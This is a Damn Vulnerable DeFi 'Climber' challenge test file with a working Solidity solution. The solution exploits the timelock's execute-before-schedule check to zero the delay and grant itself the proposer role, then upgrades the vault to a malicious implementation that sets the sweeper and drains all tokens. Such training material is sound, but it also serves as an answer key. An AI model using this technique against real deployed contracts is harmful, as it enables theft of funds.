// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberExploit exploit = new ClimberExploit(address(timelock));

        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        bytes32 salt = bytes32("salt");

        // 1. Update delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        // 2. Grant PROPOSER role to the exploit contract
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(exploit));

        // 3. Schedule this operation
        targets[2] = address(exploit);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(ClimberExploit.schedule.selector);

        // Pass data and execute
        exploit.setScheduleData(targets, values, dataElements, salt);
        timelock.execute(targets, values, dataElements, salt);

        console.log("Exploit has PROPOSER_ROLE:", timelock.hasRole(PROPOSER_ROLE, address(exploit)));

        // --- Stage 2: Upgrade Vault and Sweep Funds ---

        // 1. Deploy the new implementation
        ClimberVaultV2 v2 = new ClimberVaultV2();

        // 2. Prepare the upgrade call data
        // We want Timelock to call: vault.upgradeToAndCall(address(v2), abi.encodeCall(v2.setSweeper, (player)))
        address[] memory upgradeTargets = new address[](1);
        uint256[] memory upgradeValues = new uint256[](1);
        bytes[] memory upgradeDataElements = new bytes[](1);
        bytes32 upgradeSalt = bytes32("upgrade");

        upgradeTargets[0] = address(vault);
        upgradeValues[0] = 0;
        upgradeDataElements[0] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(v2),
            abi.encodeCall(ClimberVaultV2.setSweeper, (player))
        );

        // 3. Schedule the upgrade (via exploit contract which has PROPOSER_ROLE)
        exploit.setScheduleData(upgradeTargets, upgradeValues, upgradeDataElements, upgradeSalt);
        exploit.schedule();

        // 4. Execute the upgrade (delay is 0 now)
        timelock.execute(upgradeTargets, upgradeValues, upgradeDataElements, upgradeSalt);

        // 5. Sweep funds (as player)
        vault.sweepFunds(address(token));

        // 6. Transfer to recovery account
        token.transfer(recovery, token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract ClimberVaultV2 is ClimberVault {
    function setSweeper(address newSweeper) external {
        assembly {
            sstore(1, newSweeper) // _sweeper is at slot 1 in ClimberVault
        }
    }
}

contract ClimberExploit {
    ClimberTimelock immutable timelock;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    constructor(address _timelock) {
        timelock = ClimberTimelock(payable(_timelock));
    }

    function setScheduleData(
        address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _dataElements,
        bytes32 _salt
    ) external {
        targets = _targets;
        values = _values;
        dataElements = _dataElements;
        salt = _salt;
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
